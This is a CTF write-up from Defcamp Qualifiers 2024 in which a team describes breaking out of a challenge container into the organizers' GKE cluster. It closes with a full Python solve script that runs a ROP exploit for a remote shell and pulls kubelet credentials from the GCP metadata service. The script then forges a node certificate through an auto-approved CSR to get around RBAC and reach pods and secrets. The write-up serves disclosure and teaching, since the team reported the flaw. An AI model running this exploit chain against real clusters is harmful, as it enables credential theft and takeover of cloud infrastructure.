CTF Infrastructure Vulnerability
Defcamp Qualifiers 2024
augusto
# First attempt at pwning Kubernetes

After our dear pwner friend popped a shell in ftp-console he dumped env to check if the flag was there, no flag to be found, but there were instead some interesting environment variables:

```shell
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.59.240.1:443
```

Could that mean that we also got a Kubernetes service account mounted into the challenge container?

```shell
$ mount | grep kube
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=6175196k)
```

Unfortunately it looks like the service account is unprivileged so it can't do anything useful, time to dig more...

# Google Cloud instance metadata service

After some searching online we found out that GCP has something similar to AWS's 169.169.254.254 that's reachable via `http://metadata.google.internal/`. That required some way to do HTTP requests from our shell but nothing useful was installed (no cURL, wget, Python, Perl etc), no big issue because we managed to upload a static cURL build as a crazy big base64 blob.
In the end we managed to snag a token for the service account linked to the instance, sadly that didn't have any interesting privileges so we figured out we should go back to intended challenges and stop mucking around with CTF infra.

# Initial report to admins

We nonetheless decided to report our findings to the organizers because both things should be disabled while hosting CTFs as a best practice, organizers first reaction could be summarized as *PoC || GTFO* which in my opinion was a reasonable take if we wanted to get some extra points.
While investigating one of the organizers asked me to run `curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" -H "Metadata-Flavor: Google"` which should be getting *all* the available data from the instance metadata service mentioned earlier, initially no big secrets seemed to be contained there, but after looking closer we found a couple things that seemed interesting: `KUBELET_CERT` and `KUBELET_KEY`.

# Creating fake Kubernetes nodes for fun and profit

By searching the internet for more informations on there two variables we found an [interesting blog post by 4ARMED](https://www.4armed.com/blog/hacking-kubelet-on-gke/) that seemed to suit exactly our needs so we started fiddling around the GKE cluster, specifically:

Kubelet credentials only allow to send a CSR to the K8s control plane, this makes those credentials even less useful than the service account we initially got it it wasn't for a small detail: the control plane automatically approves CSRs if they respect some attributes.

We started by dumping all the existing CSRs and using a node CSR as a reference to craft a new CSR for a keypair we generated for purpose, then we sent the CSR to the control plane and hoped for the best.

After a couple seconds our CSR was actually approved so we could in fact pose as a cluster node.
This level of access was enough to list all running pods and dump pod specifications, so if there were any flags passed as environment variables to containers we would be able to get them easily.

Not so much in case flags were passed as secrets because by default Kubernetes employs RBAC (Role Based Access Control) to prevent nodes accessing secrets not used by any of their pods.

# The end? Maybe not

Then we asked ourselves: *how does K8s RBAC check which node is trying to access secrets?*, the answer was both easier and more obvious than we initially thought: it uses the requesting node certificate's Common Name (CN) attribute.

...wait...

Didn't we just say that we can craft arbitrary CSRs and get them automatically approved?
Yeah, we can in fact exploit that to bypass RBAC and get access to any secret we want.
This finally convinced admins that we deserved those nice extra points so in the end we were able to secure a 1st place without having to solve that pesky OSINT challenge :P

# Full solve script

```python
#!/usr/bin/env python3

from pwn import *

from pathlib import Path
from base64 import b64encode
import os
import time
import json

exe = ELF("./ftp_server_patched")
libc = ELF("./libc.so.6")

context.binary = exe

gdbscript = """
"""


certid = int(time.time())

def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = remote("34.107.71.117", 31059)

    return r


def upload_data(data: bytes, dest: str):
    r.sendlineafter(b"$ ", f"echo '{b64encode(data).decode()}' | base64 -d > {dest}".encode())

def upload_file(name: str, dest: str|None = None):
    if not dest:
        dest = name
    upload_data(Path(f'./{name}').read_bytes(), dest)

def bootstrap_curl():
    if not os.path.exists("./curl-amd64"):
        os.system(f"wget https://github.com/moparisthebest/static-curl/releases/download/v8.7.1/curl-amd64")
    assert os.path.exists("./curl-amd64")
    upload_file("curl-amd64", "curl")
    r.sendlineafter(b"$ ", b"chmod +x curl")
    r.sendlineafter(b"$ ", b"alias curl=./curl")

def download_exe(url: str, name: str):
    r.sendlineafter(b"$ ", f'./curl -kLO "{url}"'.encode())
    r.sendlineafter(b"$ ", f'chmod +x {name}'.encode())
    r.sendlineafter(b"$ ", f"alias {name}=./{name}".encode())


def main():
    global r
    r = conn()

    r.sendline(b"A")
    r.recvuntil(b"Password buffer is located at: ")
    system = int(r.recvline().strip(), 16)

    log.info(f"system: {hex(system)}")

    libc.address = system - libc.sym['system']

    log.success(f"libc base: {hex(libc.address)}")

    rop = ROP([exe, libc])
    rop.call(system, [next(libc.search(b"/bin/sh\x00"))])

    payload = flat({
        80: rop.chain()
    })

    r.sendline(payload)

    log.info("bootstrapping curl")
    bootstrap_curl()

    r.sendlineafter(b"$ ", b"curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env' | grep ^KUBELET_CERT | awk '{print $2}' | base64 -d > kubelet.crt")
    r.sendlineafter(b"$ ", b"curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env' | grep ^KUBELET_KEY | awk '{print $2}' | base64 -d > kubelet.key")
    r.sendlineafter(b"$ ", b"curl -s -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env' | grep ^CA_CERT | awk '{print $2}' | base64 -d > apiserver.crt")

    log.info("downloading kubectl")
    download_exe("https://dl.k8s.io/release/v1.31.1/bin/linux/amd64/kubectl", "kubectl")
    log.info("generating arbitrary node csr")
    os.system('openssl req -nodes -newkey rsa:2048 -keyout k8shack.key -out k8shack.csr -subj "/O=system:nodes/CN=system:node:arbitraryname"')
    log.info("uploading csr")
    upload_file("k8shack.key")
    upload_file("k8shack.csr")

    log.info("listing csrs")
    r.sendlineafter(b"$ ", b"kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get certificatesigningrequests -o json")
    csrs_text= r.recvuntil(b"$ ", drop=True)
    csrs = json.loads(csrs_text)["items"]
    csrs = list(filter(lambda x: x["metadata"]["name"].startswith("node-csr-"), csrs))
    #print(csrs)
    r.sendline()
    log.info("sending csr")
    upload_data(f"""
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: node-csr-{certid}
spec:
  groups:
  - system:authenticated
  request: {b64encode(Path("k8shack.csr").read_bytes()).decode()}
  signerName: kubernetes.io/kube-apiserver-client-kubelet
  usages:
  - digital signature
  - client auth
  username: kubelet
""".encode(), "k8shack.yaml")
    r.sendlineafter(b"$ ", b"kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} create -f k8shack.yaml")
    log.success(r.recvuntil(b"$ ").decode())
    log.info("waiting 5 secs")
    time.sleep(5)
    r.sendline(b"kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get csr node-csr-" + str(certid).encode())
    log.success(r.recvuntil(b"$ ").decode())
    r.sendline(f"kubectl --client-certificate kubelet.crt --client-key kubelet.key --certificate-authority apiserver.crt --server https://${{KUBERNETES_PORT_443_TCP_ADDR}} get csr node-csr-{certid} -o jsonpath='{{.status.certificate}}' | base64 -d > node2.crt".encode())

    r.sendlineafter(b"$ ", b"kubectl --client-certificate node2.crt --client-key k8shack.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get pods -o wide")
    r.interactive()


if __name__ == "__main__":
    main()
```
